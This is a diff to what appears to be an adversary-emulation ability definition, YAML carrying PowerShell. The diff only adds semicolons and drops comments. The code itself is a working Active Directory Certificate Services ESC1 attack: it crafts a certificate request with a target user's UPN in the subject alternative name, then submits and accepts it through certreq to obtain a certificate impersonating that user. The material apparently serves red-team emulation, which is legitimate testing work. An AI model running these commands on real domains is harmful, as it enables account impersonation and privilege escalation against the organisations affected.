@@ -13,11 +13,9 @@
     windows:
       psh:
         command: |
-          $shortname = "#{esc1.target_user}"
-          # We construct the UPN from the shortname and the domain name
-          $upn = "$shortname@#{host.domain.name}"
-          $template = "#{esc1.template}"
-          # Create the INF file for the certificate request
+          $shortname = "#{esc1.target_user}";
+          $upn = "$shortname@#{host.domain.name}";
+          $template = "#{esc1.template}";
           $inf = @"
           [NewRequest]
           Subject = "CN=$shortname"
@@ -29,12 +27,12 @@
 
           [Extensions]
           2.5.29.17 = "{text}upn=$upn"
-          "@
+          "@;
 
-          Set-Content -Path "request.inf" -Value $inf -Force
-          certreq.exe -new request.inf request.req
-          certreq.exe -submit -attrib "CertificateTemplate:$template" -config "#{adcs.ca.name_full}" request.req cert.cer
-          certreq.exe -accept cert.cer
+          Set-Content -Path "request.inf" -Value $inf -Force;
+          certreq.exe -new request.inf request.req;
+          certreq.exe -submit -attrib "CertificateTemplate:$template" -config "#{adcs.ca.name_full}" request.req cert.cer;
+          certreq.exe -accept cert.cer;
         parsers:
           plugins.adversary_emulation.app.parsers.regex_parser:
             - source: 'adcs.cert.thumbprint'
